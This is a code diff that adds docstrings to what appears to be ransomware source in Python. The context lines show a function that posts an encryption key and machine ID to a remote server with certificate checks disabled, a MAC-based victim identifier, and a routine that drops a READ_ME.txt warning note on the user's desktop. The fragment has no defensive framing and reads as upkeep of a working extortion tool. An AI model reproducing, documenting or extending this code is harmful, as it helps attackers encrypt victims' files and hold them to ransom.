@@ -20,6 +20,14 @@ import requests
 
 
 def send_key(url: str, key: bytes, machine_id: str) -> None:
+    """
+    Sends the encryption key and machine ID to a remote server.
+
+    Args:
+        url (str): The endpoint to which the data will be sent.
+        key (bytes): The encryption key to send.
+        machine_id (str): The unique identifier for the machine.
+    """
     payload = {"key": key.decode(), "machine_id": machine_id}
     try:
         response = requests.post(url, json=payload, verify=False)
@@ -34,11 +42,27 @@ def send_key(url: str, key: bytes, machine_id: str) -> None:
 
 
 def gen_machine_id(ns: UUID = uuid.NAMESPACE_DNS) -> str:
+    """
+    Generates a machine-specific UUID based on the MAC address.
+
+    Args:
+        ns (UUID, optional): The namespace used to generate the UUID.
+            Defaults to uuid.NAMESPACE_DNS.
+
+    Returns:
+        str: A UUID string representing the machine ID.
+    """
     mac = uuid.getnode()
     return str(uuid.uuid5(ns, str(mac)))
 
 
 def get_desktop_path() -> Path:
+    """
+    Retrieves the path to the user's desktop directory.
+
+    Returns:
+        Path: Path object pointing to the user's desktop.
+    """
     system = platform.system()
     if system == "Windows":
         desktop = Path(os.environ["USERPROFILE"]) / "Desktop"
@@ -48,6 +72,12 @@ def get_desktop_path() -> Path:
 
 
 def save_warning_text(machine_id: str, filename: str = "READ_ME.txt") -> None:
+    """Saves a warning file with the machine ID on the desktop.
+
+    Args:
+        machine_id (str): The unique identifier for the machine.
+        filename (str, optional): Name of the warning file. Defaults to "READ_ME.txt".
+    """
     desktop_path = get_desktop_path()
     path = desktop_path / filename
     content = [
